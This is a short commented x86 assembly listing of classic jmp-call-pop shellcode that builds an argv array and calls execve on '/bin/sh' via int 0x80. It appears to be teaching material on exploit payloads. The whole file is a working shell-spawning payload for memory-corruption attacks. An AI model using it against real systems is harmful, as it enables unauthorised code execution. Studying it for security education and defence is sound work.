section .text
global _start
_start:
BITS 32
jmp short two
one:
pop ebx ; get the address of the string 
xor eax, eax ; set eax(al) to zero
mov [ebx+7], al ; Put 1 byte Null where * is in the string
mov [ebx+8], ebx ; get the address of /bin/sh and put it into  ebx+8(AAAA)
mov [ebx+12], eax ; put 4 byte null at ebx+12(BBBB) that indicates end of command
lea ecx, [ebx+8] ; load the argv[] array starting from AAAA where /bin/sh was stored
xor edx, edx
mov al, 0x0b
int 0x80
two:
call one
db '/bin/sh*AAAABBBB' ; Here the string used is /bin/sh*AAAABBBB